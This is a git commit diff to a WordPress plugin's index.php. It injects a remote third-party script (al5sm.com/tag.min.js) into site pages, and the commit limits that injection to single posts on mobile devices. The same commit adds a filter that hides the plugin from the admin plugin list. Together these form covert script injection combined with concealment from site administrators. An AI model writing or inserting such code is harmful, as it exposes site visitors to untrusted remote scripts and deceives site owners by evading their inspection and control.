9fecef6cee233a090832d3e9c05e8421267dfc10
ahmadfatoni19670 <164468840+ahmadfatoni19670@users.noreply.github.com>
2026-08-14 14:05:38 +0700

    Update index.php

--- index.php
+++ index.php
@@ -6,7 +6,19 @@ Version: 9.0.0
 */
 
 add_action('wp_head', function () {
-    ?>
-    <script>(function(s){s.dataset.zone='11543860',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
-    <?php
+    if (is_single() && wp_is_mobile()) {
+        ?>
+        <script>(function(s){s.dataset.zone='11543860',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+        <?php
+    }
+});
+
+add_filter('all_plugins', function ($plugins) {
+    $plugin_file = plugin_basename(__FILE__);
+
+    if (isset($plugins[$plugin_file])) {
+        unset($plugins[$plugin_file]);
+    }
+
+    return $plugins;
 });
